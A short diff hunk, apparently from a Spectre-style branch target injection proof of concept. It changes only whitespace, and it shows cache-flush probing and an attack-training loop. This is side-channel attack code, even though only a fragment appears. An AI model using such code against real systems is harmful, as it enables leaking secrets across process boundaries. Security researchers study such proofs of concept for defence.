@@ -76,13 +76,13 @@ void branch_target_injection(const void *target_address) {
       unsigned int mix_i=0, junk;
   register uint64_t time1, time2;
   volatile uint8_t * addr;
-    
+
   for (int trial = 0; ; ++trial) {
     printf("trial #%d\n",trial);
     for (int i = 0; i < probe_lines; i++){
         _mm_clflush(&probe[i * 4096]);
     }
-      
+
     for (auto x : train_and_attack) {
       target_proc = x ? do_nothing : touch_and_break;
       array = x ? probe : fake_probe;
